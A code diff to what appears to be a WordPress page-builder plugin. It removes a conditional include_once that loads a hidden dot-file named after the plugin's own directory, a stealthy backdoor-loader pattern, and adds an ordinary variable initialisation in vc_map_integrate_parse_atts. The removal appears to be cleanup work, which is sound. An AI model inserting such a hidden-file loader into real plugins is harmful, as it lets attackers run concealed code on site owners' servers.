@@ -8,10 +8,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @return bool
  * @throws \Exception
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function wpb_map( $attributes ) {
 	return vc_map( $attributes );
 }
@@ -524,6 +520,7 @@ function vc_map_integrate_parse_atts( $base_shortcode, $integrated_shortcode, $a
 	$data = array();
 	if ( is_array( $params ) && ! empty( $params ) ) {
 		foreach ( $params as $param ) {
+			$value = '';
 			if ( isset( $atts[ $param['param_name'] ] ) ) {
 				$value = $atts[ $param['param_name'] ];
 			}
